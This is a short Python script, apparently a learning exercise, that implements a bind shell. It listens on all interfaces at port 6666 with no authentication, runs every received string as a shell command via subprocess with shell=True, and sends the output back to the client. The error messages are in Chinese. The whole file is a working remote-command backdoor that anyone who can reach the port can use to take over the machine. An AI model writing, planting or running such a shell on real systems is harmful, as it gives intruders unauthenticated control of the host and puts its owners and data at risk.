import socket
import threading
import subprocess
import time

bind_ip = '0.0.0.0'
bind_port = 6666

server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

server.bind((bind_ip,bind_port))
server.listen(5)

print('[*] Listening on %s:%d' % (bind_ip,bind_port))

def handle_client(client_socket):
    while True:
        request = client_socket.recv(4096)
        if request.decode()=='close_connect':
            break
        print('[*] Recieved: %s' % request.decode())
        try:
            output=subprocess.check_output(request.decode(),stderr=subprocess.STDOUT,shell=True)
            try:
                client_socket.send((output.decode(encoding='utf-8')).encode())
                client_socket.send('SEND_finished'.encode())
            except UnicodeDecodeError as e:
                client_socket.send((output.decode(encoding='gbk')).encode())
                client_socket.send('SEND_finished'.encode())
        except subprocess.CalledProcessError as e:
            client_socket.send('无此命令！'.encode())
            client_socket.send('SEND_finished'.encode())
        # client_socket.close()
    client_socket.close()
    print('diconnect')

while True:
    client,addr = server.accept()
    print('[*] Accepted connection from: %s:%d' % (addr[0],addr[1]))
    client_handler = threading.Thread(target=handle_client,args=(client,))
    client_handler.start()